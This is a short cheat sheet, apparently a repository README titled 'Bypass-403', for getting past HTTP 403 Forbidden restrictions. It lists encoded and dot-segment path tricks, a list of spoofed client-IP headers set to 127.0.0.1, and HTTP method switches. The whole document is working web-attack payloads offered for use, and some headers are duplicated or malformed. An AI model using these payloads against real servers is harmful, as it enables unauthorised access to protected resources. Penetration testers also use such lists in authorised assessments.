# Bypass-403
Bypassing 403 Forbidden: Technique and Methodology

## URL Manipulation
Add this in paths of the URL and the file which is forbidden
- /*-
- /%2f/
- /./
- /
- /*/
- {%2e}
- {%2f}
- { /*, /./}


## Headers Manipulation
Try to add Add this custom url
* X-Custom-IP-Authorization: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Forward-For: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Originating-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1
* X-Client-IP: 127.0.0.1
* X-Real-IP: 127.0.0.1
* X-Originating-IP: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Forwarded: 127.0.0.1
* Forwarded-For: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1
* X-ProxyUser-Ip: 127.0.0.1
* X-Original-URL: 127.0.0.1
* Client-IP: 127.0.0.1
* True-Client-IP: 127.0.0.1
* Cluster-Client-IP: 127.0.0.1
* X-ProxyUser-Ip: 127.0.0.1
* Host: localhost: 127.0.0.1


## Change requested method

GET → POST, GET → TRACE, GET → PUT, GET → OPTIONS
